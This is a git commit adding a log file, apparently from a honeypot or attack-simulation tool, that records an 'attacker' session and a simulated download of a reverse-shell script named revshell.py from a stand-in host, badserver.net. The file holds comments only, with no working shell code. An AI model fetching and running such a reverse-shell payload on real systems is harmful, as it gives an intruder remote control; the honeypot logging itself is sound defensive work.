c0e616e5d769e038e0dd85b5067f590c056b8e4b
K YASHAWANTH <151895724+KYASHAWANT@users.noreply.github.com>
2026-01-30 12:34:32 +0530

    Attacker files

---
+++ 127.0.0.1_1765518063_revshell.py
@@ -0,0 +1,8 @@
+# File download by attacker
+# Session ID: 127.0.0.1_1765518063
+# IP: 127.0.0.1
+# Username: admin
+# Timestamp: 2025-12-12T11:11:05.545328
+# Original filename: revshell.py
+# Content:
+# simulated download from -O http://badserver.net/revshell.py
